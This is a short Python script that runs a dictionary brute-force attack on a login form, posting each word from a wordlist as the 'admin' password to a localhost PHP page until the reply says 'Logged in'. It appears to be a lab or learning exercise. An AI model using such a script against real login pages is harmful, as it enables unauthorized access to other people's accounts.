import os
import sys
import requests

# open wordlist and save the content in words
with open(os.path.join(sys.path[0], 'wordlist.txt'), 'r') as myfile:
	words = myfile.read()

# split wordlist at the end of the line to an array
wordsarray = words.split('\n')

# do this for every word in the array
for word in wordsarray:
	# send post requests with username admin and your word in the list
	result = requests.post('http://localhost:8888/php/login.php', data={'lgnm': 'admin', 'lgpw': word})
	# check if http response code is 200 OK
	if result.status_code == 200:
		# search the content for the magic string
		# magic string = pattern that the password worked and you are logged in
		if str(result.content).find('Logged in') >= 0:
			print('pw is: ' + word)
			break
